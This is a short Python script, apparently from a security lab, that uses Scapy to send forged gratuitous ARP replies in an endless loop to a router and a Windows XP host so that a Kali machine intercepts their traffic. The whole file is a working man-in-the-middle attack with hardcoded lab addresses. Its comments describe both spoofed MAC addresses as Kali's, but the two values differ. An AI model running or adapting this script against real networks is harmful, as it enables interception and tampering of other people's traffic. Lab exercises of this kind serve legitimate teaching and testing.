
from scapy.all import *

# This code sends gratuitous ARPs to XP and rtr so that Kali is in the middle of the communication between external router machine and Windows machine XP.

class ARP_Spoof_Grat(object): 

         def startSpoof(self):
             while(True):

#There are three parameters in order external router IP, Windows machine IP and Kali machine physical address
                 send(ARP(op=2,psrc='10.10.111.1',pdst='10.10.111.101',hwsrc='00:00:00:00:00:04'))

#There are three parameters in order Windows machine IP, external router IP and Kali machine physical address
                 send(ARP(op=2,psrc='10.10.111.101',pdst='10.10.111.1',hwsrc='00:00:00:00:00:02')) 
            
                   
grat=ARP_Spoof_Grat() 
grat.startSpoof() #Start spoofing

